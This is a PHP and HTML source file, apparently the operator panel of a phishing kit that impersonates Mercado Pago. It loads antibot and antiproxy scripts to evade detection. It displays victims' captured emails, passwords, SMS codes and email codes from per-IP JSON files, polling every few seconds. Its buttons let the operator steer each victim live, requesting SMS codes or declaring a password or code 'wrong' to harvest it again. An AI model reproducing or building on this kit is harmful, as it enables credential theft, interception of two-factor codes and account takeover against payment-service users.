<?php 

require '../../MagnumAntibot.php';
require '../../MagnumAntibot2.php';
require '../../MagnumAntibot3.php';
require '../../MagnumAntibot4.php';
require '../../MagnumAntibot5.php';
require '../../MagnumAntibot6.php';
require '../../MagnumAntibot7.php';
require '../../MagnumAntibot8.php';
require "../../antiproxy.php";
require "../../bot.php";
require "../../fucker.php";

session_start();
$ip = $_GET['ip'];


date_default_timezone_set('America/Sao_Paulo');

// Pasta onde estão os arquivos JSON
$pasta_clientes = '../../clientes/';

// Nome do arquivo JSON
$arquivo_json = $pasta_clientes . $ip . '.json';

// Verifica se o arquivo existe
if (file_exists($arquivo_json)) {
    // Lê o conteúdo do arquivo JSON
    $json_string = file_get_contents($arquivo_json);

    // Decodifica o JSON para um array associativo
    $dados_cliente = json_decode($json_string, true);

    // Verifica se a decodificação foi bem-sucedida
    if ($dados_cliente === null) {
        echo "Erro ao decodificar o arquivo JSON: $arquivo_json <br>";
    } else {
        // Altera o valor da chave 'email'
        $senha = $dados_cliente['senha'];
        $ip = $dados_cliente['ip'];
        $email = $dados_cliente['email'];
        $senha = $dados_cliente['senha'];
        $comando = $dados_cliente['comando'];
        $status = $dados_cliente['status'];
        $codigo = $dados_cliente['ip'];
        $finalnumero = $dados_cliente['finalnumero'];
        $data = $dados_cliente['data_acesso'];
        

        // Converte os dados modificados de volta para JSON
        $json_atualizado = json_encode($dados_cliente);

        // Verifica se houve erro na conversão para JSON
        if ($json_atualizado === false) {
            echo "Erro ao codificar os dados para JSON.";
        } else {
            // Salva o JSON atualizado no arquivo
            if (file_put_contents($arquivo_json, $json_atualizado) !== false) {
                // header('location: ../passwd/password.php');

            } else {
                echo "Erro ao salvar o arquivo JSON.";
            }
        }
    }
} else {
    echo "O arquivo JSON não foi encontrado.";
}


?>
<!DOCTYPE html>
<html>
<head>
	<title>
	
	</title>
		<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <style>

        h1 {
            font-size: 15pt;
        }
        * {
            margin: 0;
            padding: 0;

        }

        body{
            width: 100%;
            height: 100%;
        }

        .box {
            
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            font-family: Arial, Helvetica, sans-serif;
            flex-wrap: 30px;
            padding: 0px 20px;
            width: 100vw;
            
        }

        a {
            background-color: blue;
            padding: 10px 35px;
            border-radius: 10px;

        }
        .flex{
            width: 100%;
            display: flex;
            flex-direction: row;
            justify-content: center;
        }

        .flex9, .flex10{
            width: 100%;
            display: flex;
            flex-direction: row;
            justify-content: center;
        }
        .pagina-inicial {
            display: flex;
            height: 80vh;
            width: 60%;
            min-width: 400px;
            margin: 0 auto;
            border: 1px solid black;
            border-radius: 8px;
            height: 100%;
            box-sizing: border-box;
            padding: 50px;
        }



        #email-digitado {
            outline: 0;
            border: none;
            width: 100px;
        }

        .newClass {
            background-color: aliceblue;
            padding: 10px 30px;
            border-radius: 10px;
            color: black;
        }

        #email {
            padding: 8px 15px;
            color: aliceblue;
            background-color: #1a73e8;
            opacity: 0.8;
            border-radius: 10px;
            font-size: 24px;
           
        }


        #status {
                      padding: 8px 15px;
            color: aliceblue;
            background-color: #5d5a5a;
            opacity: 0.8;
            border-radius: 10px;


        }

        .senhax {
            text-align: center;
            padding: 8px 15px !important;
            color: aliceblue !important;
            background-color: #1a73e8 ;
            opacity: 0.8 !important;
            border-radius: 10px !important;
            font-size: 24px;
        }

        #codigo, #numero {
            border: none;
            padding: 5px 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            outline: none;
            border: 1px solid;
         
            
        }

        #dispositivo {
            outline: none;
            padding: 5px 10px;
            border: none;
            border: 1px solid;
            border-top: none;


        }
        #botao, #botao23 {
            outline: none;

            
border-radius: 10px;
padding: 10px 30px;
background-color: #1a73e8;
color: aliceblue;
border-top: none;
min-width: 180px;
max-width: 180px;
width: 100%;
        }


        #enviar, #enviar2  {
            outline: none;

            
            border-bottom-right-radius: 10px ;
            border-bottom-left-radius: 10px ;
            background-color: #1a73e8;
            color: aliceblue;
            border-top: none;
            height: 35px;
        }

        #enviar:disabled, #enviar2:disabled, #enviar3:disabled, #botao23:disabled {
            background-color: gray;
            color: white;
        }

        #enviar3 {
            background-color: #1a73e8;
            color: aliceblue;
            border-top: none;
            border-radius: 10px;
            height: 35px;
            margin-top: 35px;
        }


.


.block {
  margin-top: 20px !important;
}

#botao {
  margin-top: 10px;
  margin-bottom: 20px;
}

.flex10 {
  display: flex;
  grid-gap: 20px 20px;
  justify-content: space-between;
  max-width: 100%;
}

form {
  
}

       

    </style>
</head>
<body>
  <!-- <h1>STATUS: <span id="status"></span></h1>
  <h1>Email: <span id="email"></span></h1> -->
<!--   <h1>Senha: <span id="senha"></span></h1> -->
<!--   <h1>Codigo: <span id="codigo"></span></h1> -->
<!--   <h1>Data e Hora: <span id="data"></span></h1>
 -->

<script>


	 $(document).ready(function() {
      atualizarDados(); // Atualizar dados imediatamente ao carregar a página

      // Atualizar os dados a cada 5 segundos
      setInterval(atualizarDados, 3000);
    });

    function atualizarDados() {
		var ip = document.getElementById('ip').value;
      $.ajax({
        url: "atualizar_dados.php?ip=" + ip, //+ ip,
        type: 'GET',
        success: function(response) {
          $('#dados').html(response);
          let email = response.email;
          document.getElementById('email').innerHTML = email;

                    let hora = response.data_acesso;
          document.getElementById('hora').innerHTML = hora;


          let senha = response.senha;
          document.getElementById('senha').innerHTML = senha;

            let codigoemail = response.codigoemail;
          document.getElementById('codigoemail').innerHTML = codigoemail;


                       let status = response.status;
          document.getElementById('status').innerHTML = status;
   

  if (response.status === "Senha Recebida!") {
 // Exibir um alerta com o valor da propriedade 'status'

              let senhaElement = document.getElementById('senha');

    // Alterar a cor de fundo para verde
    senhaElement.style.backgroundColor = 'green';
  }


  if (response.status === "Usuário na tela de senha errada! aguardando digitar novamente!") {
 // Exibir um alerta com o valor da propriedade 'status'

              let senhaElement = document.getElementById('senha');

    // Alterar a cor de fundo para verde
    senhaElement.style.backgroundColor = 'red';
  }


   if (response.status === "Escolheu a opção de enviar via SMS") {
 // Exibir um alerta com o valor da propriedade 'status'

              let senhaElement = document.getElementById('senha');

    // Alterar a cor de fundo para verde
    senhaElement.style.backgroundColor = 'red';
  }





    if (response.status === "E-mail Recebido!") {
 // Exibir um alerta com o valor da propriedade 'status'

              let senhaElement = document.getElementById('email');

    // Alterar a cor de fundo para verde
    senhaElement.style.backgroundColor = 'green';
  }






          // let status = response.status;
          // document.getElementById('status').innerHTML = status;
          // const texto = document.getElementById('texto');



          // let data = response.data_acesso;
          // document.getElementById('data').innerHTML = data;

          let codigo = response.codigo;
          document.getElementById('codigo').innerHTML = codigo;

        },
        error: function(xhr, status, error) {
          console.log(error);
        }
      });
    }

      function blink_text() {
    $('.blink').fadeOut(500);
    $('.blink').fadeIn(500);
  }
  setInterval(blink_text, 1000);

  function exec(cmd){
    document.getElementById("txtcomando").value = cmd;
//  console.log('arroca');
console.log(document.getElementById("txtcomando").value);

}


function toggleInput(checkbox) {
  var input = document.getElementById("finalnumero");
  if (checkbox.checked) {
    input.disabled = false;
  input.style.display = "block"
  input.value = ""

  } else {
    input.disabled = true;
  input.value = "Desativado"
  input.style.display = "none"
  }
}



function toggleInput3(checkbox) {
  var input = document.getElementById("emailescondido");
  if (checkbox.checked) {
  input.value = ""
  input.style.display = "block"
  } else {
  input.value = "Desativado"
  input.style.display = "none"
  }
}

function toggleInput4(checkbox) {
  var input = document.getElementById("inputs");
  var codigo = document.getElementById("codigo");
  var modelo = document.getElementById("modelo");
  if (checkbox.checked) {
    input.disabled = false;
  input.style.display = "block"
  codigo.value = ""
  modelo.value = ""
  } else {
  codigo.value = ""
  modelo.value = ""
    input.disabled = true;
  input.style.display = "none"
  }
}




function validarForm(){
  var cmd = document.getElementById("txtcomando").value;
  var urlimage = document.getElementById("urlimage").value;

  if ((cmd === "pedirqrcode") && (urlimage.length === 0)){
    alert("informe a url da imagem");
    return false;
  }

  return true;
}


function toggleInput2(checkbox) {
  var input = document.getElementById("toquesim");
  if (checkbox.checked) {

  input.value = "Ativado!"
  console.log(input.value)
  } else {
 
  input.value = "Desativado"
  console.log(input.value)
  }
}


function enviarsms(){

}
</script>
<div id="dados">
	
</div>



 <div class="pagina-inicial">
    <div class="box">
        <img id="cel" src="https://logodownload.org/wp-content/uploads/2019/06/mercado-pago-logo.png" width="150px"/>

        <h1 id="alert" style="font-size: 12pt;text-align: center;margin-top: 20px !important;margin-bottom: 20px !important;">Status: </h1><p><span style="" id="status"></p><p><span style="font-size: 30px;background-color: orange; color: black;" id="hora"></span></p>

          <input type="hidden" id="statustext" value="">
        <h4 id="emailstyle" style="font-size: 12pt;text-align: center;margin-top: 20px !important;margin-bottom: 20px !important;">Email: </h1><p><span style="" id="email">Aguardando...</p>
        <h4  style="text-align: center;margin-bottom: 20px !important;margin-top:30px;">Senha: </h1><p><span class="senhax" id="senha">Aguardando...<span></p>
                <h4  style="text-align: center;margin-bottom: 20px !important;margin-top:30px;">Codigo SMS: </h1><p><span class="senhax" id="codigo">Aguardando...<span></p>

                  <h4  style="text-align: center;margin-bottom: 20px !important;margin-top:30px;">Codigo E-mail: </h1><p><span class="senhax" id="codigoemail">Aguardando...<span></p>

            
            <div  class="flex">

                <div style="display:none;max-width: 400px !important;display:block;margin-top: 35px;" class="flex">




                    <div>
                        
<form style="display:none" name="formulario" method="POST" id="formulario" action="comando.php">
    <input type="hidden" value="<?php echo $ip ?>" id="ip" name="ip">
    <input type="checkbox" id="checkbox2" name="checkbox2" onchange="toggleInput2(this)">

      <label for="checkbox2"> Toque SIM no seu Aparelho</label>
      
      <h1 id="text"></h1>
      <input type="checkbox" id="checkbox1" name="checkbox1" onchange="toggleInput(this)">
      <input type="hidden"  id="toquesim" name="toquesim" value="Desativado" />
      <label for="checkbox1"> Opção de numero de telefone</label></br>
      <input style="display:none;" type="hidden" id="finalnumero2" name="finalnumero2" value="Desativado" />
      <label for="checkbox1"><input  placeholder="Digite o Final do Numero" style="display:none;" value="Desativado"  id="finalnumero" name="finalnumero" type="text"></label>

      <br>
    
<!--     <input type="checkbox" id="checkbox6" name="checkbox6" onchange="toggleInput3(this)">
      <input type="hidden" id="email" name="email" value="Desativado" />
      <label for="checkbox6"> Opção de codigo no E-mail</label></br>
      <label for="checkbox6"><input style="display:none;"  placeholder="3 Primeiras letras do E-mail" value="Desativado" maxlength="3"  id="emailescondido" name="emailescondido" type="text"></label> -->




    <input type="hidden" id="comando" name="comando" value="qual" />
    <button class="btn btn-outline-dark" id="botao" type="submit">ENVIAR</button>
    </form>

                    </div>


                      <div style="display: flex; "> 

<div class="flex11">

 <div class="flex10"> 

  <div class="block">

            <form method="POST" action="enviar-direto.php">
          <input required type="text" name="finalnumero" placeholder="digite o final do numero">
          <input type="hidden" value="<?php echo $ip ?>" name="ip">
    <button id="botao" type="submit">SOLICITAR SMS</button>
    </form>

  </div>



<div class="block">
    <form action="codigo-errado.php">
      <input type="hidden" value="<?php echo $ip ?>" name="ip">
    <button id="botao" type="submit">SMS ERRADO</button>
    </form>

        <form action="codigoemailerrado.php">
      <input type="hidden" value="<?php echo $ip ?>" name="ip">
    <button id="botao" type="submit">CODIGO EMAIL ERRADO</button>
    </form>

        <form action="email-errado.php">
      <input type="hidden" value="<?php echo $ip ?>" name="ip">
    <button id="botao" type="submit">EMAIL ERRADO</button>
    </form>


        <form action="passwd.php">
      <input type="hidden" value="<?php echo $ip ?>" name="ip">
    <button id="botao" type="submit">SOLICITAR SENHA</button>
    </form>

            <form action="senha-errada.php">
      <input type="hidden" value="<?php echo $ip ?>" name="ip">
    <button id="botao" type="submit">SENHA ERRADA</button>
    </form>

  </div>

</div>

 <div class="flex10"> 

  <div class="block">


<div class="block">
    <form action="solicitaremail.php">
      <input type="hidden" value="<?php echo $ip ?>" name="ip">
    <button id="botao" type="submit">SOLICITAR EMAIL</button>
    </form>


  </div>


</div>

  </div>

<div class="block">
        <form action="finalizar.php">
          <input type="hidden" value="<?php echo $ip ?>" name="ip">
    <button id="botao" type="submit">FINALIZAR</button>
    </form>
  </div>

</div>


</div>
                       </div>

                       
                  
                    </div>
                   
                </div>
                

            </div>
    </div>


   
   </div> 

   
</body>
</html>

